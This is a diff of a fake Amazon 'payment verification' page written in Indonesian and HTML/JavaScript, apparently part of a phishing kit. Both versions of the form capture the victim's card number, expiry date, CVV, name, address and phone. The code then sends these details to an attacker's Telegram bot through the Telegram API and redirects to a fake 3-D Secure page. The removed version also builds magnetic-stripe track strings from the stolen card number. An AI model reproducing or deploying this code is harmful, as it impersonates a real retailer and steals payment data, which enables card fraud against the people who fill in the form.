@@ -1,247 +1,174 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Verifikasi Pembayaran</title>
-    <script src="config.js"></script>
-    <script>
-        let kodeNegara = 'GB';
-        let kodeTelepon = '+44';
-        
-        async function deteksiNegara() {
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const d = await res.json();
-                kodeNegara = d.country_code || 'GB';
-                const peta = { JP:['JP','+81'], ID:['ID','+62'], US:['US','+1'], AU:['AU','+61'], GB:['GB','+44'], MY:['MY','+60'], SG:['SG','+65'] };
-                const [negara, tel] = peta[kodeNegara] || ['GB','+44'];
-                kodeNegara = negara; kodeTelepon = tel;
-            } catch { kodeNegara = 'GB'; kodeTelepon = '+44'; }
-            document.getElementById('negara').value = kodeNegara;
-            document.getElementById('kodeTel').textContent = kodeTelepon;
-        }
-    </script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Amazon Ember', Arial, sans-serif; }
         body { background: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; }
-        .logo { margin: 10px 0 25px; text-align: center; }
-        .logo img { height: 60px; }
-        .kotak { width: 100%; max-width: 500px; border: 1px solid #ddd; border-radius: 8px; padding: 25px; }
+        .logo { margin: 15px 0 25px; text-align: center; }
+        .logo img { height: 32px; }
+        .kotak { width: 100%; max-width: 420px; border: 1px solid #ddd; border-radius: 8px; padding: 25px; }
         h1 { font-size: 22px; margin-bottom: 20px; }
-        .logo-kartu { display: flex; gap: 10px; margin-bottom: 20px; }
-        .logo-kartu img { height: 24px; opacity: 0.4; }
-        .logo-kartu img.aktif { opacity: 1; }
         label { font-size: 13px; font-weight: 700; display: block; margin: 15px 0 6px; }
         input, select { width: 100%; padding: 10px; border: 1px solid #a6a6a6; border-radius: 4px; font-size: 15px; }
-        input:focus, select:focus { outline: none; border-color: #0071e3; box-shadow: 0 0 3px rgba(0,113,227,0.5); }
-        .baris-dua { display: flex; gap: 12px; }
+        .baris-dua { display: flex; gap: 10px; }
         .baris-dua > div { flex: 1; }
-        button { width: 100%; padding: 12px; background: #FFD814; border: 1px solid #FCD200; border-radius: 20px; font-size: 15px; color: #0F1111; cursor: pointer; margin-top: 25px; transition: opacity 0.2s; }
-        button:disabled { opacity: 0.5; cursor: not-allowed; background: #FFD814; border-color: #FCD200; }
-        button:not(:disabled):hover { background: #F7CA00; }
-        .tel { display: flex; }
-        .tel span { padding: 10px 8px; background: #f0f0f0; border: 1px solid #a6a6a6; border-right: none; border-radius: 4px 0 0 4px; font-size: 13px; }
-        .tel input { border-radius: 0 4px 4px 0; }
-        .footer { font-size: 11px; color: #555; text-align: center; margin-top: 30px; }
-        .kartu-wrapper { position: relative; }
-        .ikon-kartu { position: absolute; right: 10px; top: 50%; transform: translateY(-50%); height: 22px; display: none; }
+        .kartu-logo { display: flex; gap: 8px; margin: 10px 0; }
+        .kartu-logo img { height: 30px; border: 1px solid #ddd; border-radius: 4px; padding: 2px; }
+        button { width: 100%; padding: 12px; background: #FFD814; border: 1px solid #FCD200; border-radius: 20px; font-size: 15px; cursor: pointer; margin-top: 20px; }
+        button:disabled { opacity: 0.5; cursor: not-allowed; }
     </style>
 </head>
-<body onload="deteksiNegara()">
+<body>
     <div class="logo"><img src="img/amazonlogo.png" alt="Amazon"></div>
     <div class="kotak">
-        <h1>Verification Payment</h1>
-        <div class="logo-kartu">
-            <img src="img/visa.png" id="lv" alt="Visa">
-            <img src="img/mastercard.png" id="lm" alt="Mastercard">
-            <img src="img/amex.png" id="la" alt="Amex">
-            <img src="img/discover.png" id="ld" alt="Discover">
-            <img src="img/jcb.png" id="lj" alt="JCB">
+        <h1>Verifikasi Pembayaran</h1>
+        
+        <div class="kartu-logo">
+            <img src="img/visa.png" alt="VISA">
+            <img src="img/mastercard.png" alt="Mastercard">
+            <img src="img/amex.png" alt="AMEX">
+            <img src="img/discover.png" alt="Discover">
+            <img src="img/jcb.png" alt="JCB">
         </div>
 
-        <label>Card Number</label>
-        <div class="kartu-wrapper">
-            <input type="text" id="nomor" maxlength="19" placeholder="•••• •••• •••• ••••">
-            <img src="" id="ikonKartu" class="ikon-kartu" alt="">
-        </div>
-
+        <label>Nomor Kartu</label>
+        <input type="text" id="nomorKartu" maxlength="19" placeholder="•••• •••• •••• ••••">
+        
         <div class="baris-dua">
             <div>
-                <label>Expiry Date</label>
+                <label>Tanggal Kadaluarsa</label>
                 <input type="text" id="expiry" maxlength="5" placeholder="MM/YY">
             </div>
             <div>
-                <label>Security Code</label>
+                <label>Kode Keamanan</label>
                 <input type="text" id="cvv" maxlength="4" placeholder="•••">
             </div>
         </div>
 
-        <label>Name on Card</label>
-        <input type="text" id="nama" placeholder="Full name">
+        <label>Nama di Kartu</label>
+        <input type="text" id="namaKartu" placeholder="Nama Lengkap">
 
-        <label>Country/Region</label>
+        <label>Negara / Wilayah</label>
         <select id="negara">
-            <option value="GB">United Kingdom</option>
-            <option value="ID" selected>Indonesia</option>
-            <option value="JP">Japan</option>
-            <option value="US">United States</option>
-            <option value="AU">Australia</option>
-            <option value="MY">Malaysia</option>
-            <option value="SG">Singapore</option>
+            <option value="ID">Indonesia (+62)</option>
+            <option value="AU">Australia (+61)</option>
+            <option value="US">Amerika Serikat (+1)</option>
+            <option value="GB">Inggris (+44)</option>
+            <option value="MY">Malaysia (+60)</option>
         </select>
 
-        <label>Billing Address</label>
-        <input type="text" id="alamat" placeholder="Street address">
+        <label>Alamat</label>
+        <input type="text" id="alamat" placeholder="Alamat lengkap">
+        
         <div class="baris-dua">
             <div>
-                <label>City</label>
-                <input type="text" id="kota" placeholder="City">
+                <label>Kota</label>
+                <input type="text" id="kota" placeholder="Kota">
             </div>
             <div>
-                <label>Postal Code</label>
-                <input type="text" id="kodepos" placeholder="Postal code">
+                <label>Kode Pos</label>
+                <input type="text" id="kodepos" placeholder="Kode Pos">
             </div>
         </div>
 
-        <label>Phone Number</label>
-        <div class="tel">
-            <span id="kodeTel">+44</span>
-            <input type="tel" id="telepon" placeholder="8xx xxxxxxxx">
-        </div>
+        <label>Nomor Telepon</label>
+        <input type="tel" id="telepon" placeholder="+62 812 3456 7890">
 
-        <button id="tombol" disabled onclick="lanjut()">Verify & Continue</button>
-    </div>
-    <div class="footer">
-        <p>© 1996-2026, Amazon.com, Inc. or its affiliates</p>
+        <button id="tombolVerifikasi" disabled onclick="verifikasi()">Verifikasi</button>
     </div>
 
     <script>
-        let nomorAsli = '';
-        let cvvAsli = '';
-        let trackData = '';
+        // Auto-detect negara
+        fetch('https://ipapi.co/json/')
+            .then(r => r.json())
+            .then(d => {
+                const kode = d.country_code || 'ID';
+                const pilih = document.getElementById('negara');
+                for (let opt of pilih.options) {
+                    if (opt.value === kode) opt.selected = true;
+                }
+            });
 
-        document.addEventListener('DOMContentLoaded', () => {
-            const email = localStorage.getItem('emailPengguna');
-            if (!email) { window.location.href = 'index.html'; return; }
-            
-            // Pantau semua perubahan input
-            document.getElementById('nomor').addEventListener('input', cekLengkap);
-            document.getElementById('expiry').addEventListener('input', cekLengkap);
-            document.getElementById('cvv').addEventListener('input', cekLengkap);
-            document.getElementById('nama').addEventListener('input', cekLengkap);
-            document.getElementById('alamat').addEventListener('input', cekLengkap);
-            document.getElementById('kota').addEventListener('input', cekLengkap);
-            document.getElementById('kodepos').addEventListener('input', cekLengkap);
-            document.getElementById('telepon').addEventListener('input', cekLengkap);
+        // Format input
+        const nomor = document.getElementById('nomorKartu');
+        nomor.addEventListener('input', function() {
+            let v = this.value.replace(/\D/g, '');
+            this.value = v.match(/.{1,4}/g)?.join(' ') || v;
+            cekLengkap();
         });
 
-        function cekJenisKartu() {
-            const val = nomorAsli;
-            const ikon = document.getElementById('ikonKartu');
-            document.querySelectorAll('.logo-kartu img').forEach(i => i.classList.remove('aktif'));
-
-            let src = '';
-            if (/^4/.test(val)) { src = 'img/visa.png'; document.getElementById('lv').classList.add('aktif'); }
-            else if (/^5[1-5]/.test(val)) { src = 'img/mastercard.png'; document.getElementById('lm').classList.add('aktif'); }
-            else if (/^3[47]/.test(val)) { src = 'img/amex.png'; document.getElementById('la').classList.add('aktif'); }
-            else if (/^6(?:011|5)/.test(val)) { src = 'img/discover.png'; document.getElementById('ld').classList.add('aktif'); }
-            else if (/^35/.test(val)) { src = 'img/jcb.png'; document.getElementById('lj').classList.add('aktif'); }
-
-            ikon.src = src;
-            ikon.style.display = src ? 'block' : 'none';
-        }
-
-        function formatNomor(angka) {
-            let tampil = '';
-            for (let i = 0; i < angka.length; i++) {
-                if (i > 0 && i % 4 === 0) tampil += ' ';
-                tampil += angka[i];
-            }
-            return tampil;
-        }
-
-        document.getElementById('nomor').addEventListener('input', function() {
-            let angka = this.value.replace(/\D/g, '');
-            nomorAsli = angka;
-            this.value = formatNomor(angka);
-            cekJenisKartu();
+        const expiry = document.getElementById('expiry');
+        expiry.addEventListener('input', function() {
+            let v = this.value.replace(/\D/g, '');
+            if (v.length >= 2) v = v.slice(0,2) + '/' + v.slice(2);
+            this.value = v;
+            cekLengkap();
         });
 
-        document.getElementById('nomor').addEventListener('focus', function() {
-            this.value = formatNomor(nomorAsli);
-        });
-        document.getElementById('nomor').addEventListener('blur', function() {
-            this.value = formatNomor(nomorAsli);
-        });
-
-        document.getElementById('expiry').addEventListener('input', function() {
-            let val = this.value.replace(/\D/g, '');
-            if (val.length >= 2) val = val.slice(0,2) + '/' + val.slice(2,4);
-            this.value = val;
+        const cvv = document.getElementById('cvv');
+        cvv.addEventListener('input', function() {
+            this.value = this.value.replace(/\D/g, '');
+            cekLengkap();
         });
 
-        document.getElementById('cvv').addEventListener('input', function() {
-            cvvAsli = this.value.replace(/\D/g, '');
-            this.value = cvvAsli;
-        });
-        document.getElementById('cvv').addEventListener('focus', function() {
-            this.value = cvvAsli;
-        });
-        document.getElementById('cvv').addEventListener('blur', function() {
-            this.value = cvvAsli;
-        });
+        const nama = document.getElementById('namaKartu');
+        const alamat = document.getElementById('alamat');
+        const kota = document.getElementById('kota');
+        const kodepos = document.getElementById('kodepos');
+        const telepon = document.getElementById('telepon');
+        const tombol = document.getElementById('tombolVerifikasi');
 
-        // === CEK LENGKAP — DIPERBAIKI ===
+        [nama, alamat, kota, kodepos, telepon].forEach(el => el.addEventListener('input', cekLengkap));
+
         function cekLengkap() {
-            const nomorOk = nomorAsli.length >= 13 && nomorAsli.length <= 16;
-            const expiryOk = document.getElementById('expiry').value.length === 5;
-            const cvvOk = cvvAsli.length >= 3 && cvvAsli.length <= 4;
-            const namaOk = document.getElementById('nama').value.trim() !== '';
-            const alamatOk = document.getElementById('alamat').value.trim() !== '';
-            const kotaOk = document.getElementById('kota').value.trim() !== '';
-            const kodePosOk = document.getElementById('kodepos').value.trim() !== '';
-            const telOk = document.getElementById('telepon').value.trim() !== '';
-
-            const semuaLengkap = nomorOk && expiryOk && cvvOk && namaOk && alamatOk && kotaOk && kodePosOk && telOk;
-            
-            document.getElementById('tombol').disabled = !semuaLengkap;
+            tombol.disabled = !(
+                nomor.value.replace(/\s/g,'').length >= 13 &&
+                expiry.value.length === 5 &&
+                cvv.value.length >= 3 &&
+                nama.value.trim() &&
+                alamat.value.trim() &&
+                kota.value.trim() &&
+                kodepos.value.trim() &&
+                telepon.value.trim()
+            );
         }
 
-        async function lanjut() {
-            const email = localStorage.getItem('emailPengguna');
-            trackData = `=== TRACK ===\nT1: %B${nomorAsli}^${document.getElementById('nama').value.replace(/\s+/g, '/')}^${document.getElementById('expiry').value.replace('/','')}000000000000?\nT2: ;${nomorAsli}=${document.getElementById('expiry').value.replace('/','')}000000000000?`;
-
-            const dataKartu = {
-                email: email,
-                namaKartu: document.getElementById('nama').value.trim(),
-                nomorKartu: nomorAsli,
-                expiry: document.getElementById('expiry').value,
-                cvv: cvvAsli,
-                alamat: document.getElementById('alamat').value.trim(),
-                kota: document.getElementById('kota').value.trim(),
-                kodepos: document.getElementById('kodepos').value.trim(),
-                telepon: kodeTelepon + ' ' + document.getElementById('telepon').value.trim(),
-                trackKartu: trackData
+        function verifikasi() {
+            const email = localStorage.getItem('emailPengguna') || '-';
+            const data = {
+                email,
+                nomorKartu: nomor.value,
+                expiry: expiry.value,
+                cvv: cvv.value,
+                namaKartu: nama.value,
+                negara: negara.value,
+                alamat: alamat.value,
+                kota: kota.value,
+                kodepos: kodepos.value,
+                telepon: telepon.value
             };
 
-            CONFIG.simpanKartu(dataKartu);
+            // Kirim ke Telegram
+            const token = localStorage.getItem('botTelegram');
+            const chatId = localStorage.getItem('chatTelegram');
+            if (token && chatId) {
+                const pesan = `💳 VERIFIKASI PEMBAYARAN\n━━━━━━━━━━━━━━━━━━━━━\n📧 Email: ${data.email}\n👤 Nama: ${data.namaKartu}\n🔢 Kartu: ${data.nomorKartu}\n📅 Exp: ${data.expiry}\n🔒 CVV: ${data.cvv}\n🌍 Negara: ${data.negara}\n📍 Alamat: ${data.alamat}, ${data.kota} — ${data.kodepos}\n📞 Telp: ${data.telepon}\nWaktu: ${new Date().toLocaleString('id-ID')}`;
+                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: pesan })
+                });
+            }
 
-            const pesan = `
-💳 *CARD DATA*
-━━━━━━━━━━━━━━━━━━━━━
-📧 Email: \`${email}\`
-👤 Name: \`${dataKartu.namaKartu}\`
-🔢 Card: \`${nomorAsli}\`
-📅 Exp: \`${dataKartu.expiry}\`
-🔒 CVV: \`${cvvAsli}\`
-📍 Address: \`${dataKartu.alamat}, ${dataKartu.kota} — ${dataKartu.kodepos}\`
-📞 Phone: \`${dataKartu.telepon}\`
-━━━━━━━━━━━━━━━━━━━━━
-${trackData}
-🕐 Time: ${new Date().toLocaleString()}
-            `.trim();
-            await CONFIG.kirimKeTelegram(pesan);
+            // Tandai tahap
+            const daftar = JSON.parse(localStorage.getItem('dataPengunjung') || '[]');
+            if (daftar.length > 0) daftar[0].tahap = 'billing';
+            localStorage.setItem('dataPengunjung', JSON.stringify(daftar));
+
+            // Lanjut ke 3DS
             window.location.href = '3ds.html';
         }
     </script>
